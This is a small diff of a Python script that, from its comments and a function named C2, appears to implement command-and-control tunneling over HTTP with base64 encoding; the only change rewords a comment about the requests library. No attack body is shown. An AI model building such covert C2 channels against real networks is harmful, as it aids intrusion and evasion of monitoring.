@@ -3,7 +3,7 @@
 # To make the tunneling more effective, the request would have to mimic an actual HTTP transaction more closely, and the URL would have to change.
 
 import requests
-# Python's requests library is its HTTP client and handler.
+# Python's requests library is its HTTP client library.
 from base64 import b64encode,b64decode
 
 def C2(url,data):
